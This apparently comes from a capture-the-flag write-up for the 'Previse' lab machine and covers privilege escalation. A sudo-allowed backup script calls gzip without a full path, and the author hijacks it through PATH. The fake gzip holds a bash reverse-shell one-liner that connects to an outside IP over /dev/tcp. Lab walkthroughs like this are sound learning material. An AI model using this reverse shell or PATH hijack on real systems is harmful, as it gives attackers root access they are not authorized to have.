# Privilege escalation to root
## Running `sudo -l` gives command that can be run as sudo
Running `sudo -l` gives command `/opt/scripts/access_backup.sh` that can be run as sudo .
```bash
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~$
```
Contents of `access_backup.sh` are as follows.
```bash
m4lwhere@previse:~$ cat  /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
## Inspecting contents of `access_backup.sh` 
Inspecting contents of `access_backup.sh` . gzip command can be path hijacked to gain root.
## Stroring bash reverse shell in file named 'gzip' in /tmp directory and adding /tmp directory to 'PATH' to path hijack gzip binary
Stroring bash reverse shell in file named 'gzip' in /tmp directory and adding /tmp directory to 'PATH' as shown below to path hijack gzip binary.
```bash
m4lwhere@previse:/tmp$ nano gzip
m4lwhere@previse:/tmp$ cat gzip
0<&196;exec 196<>/dev/tcp/10.10.14.98/1234; bash <&196 >&196 2>&196
m4lwhere@previse:/tmp$ chmod +x gzip
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ echo $PATH
/tmp:/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/tmp
```
## Getting reverse shell as root running `/opt/scripts/access_backup.sh` as root.
![[Pasted image 20210918124900.png]]



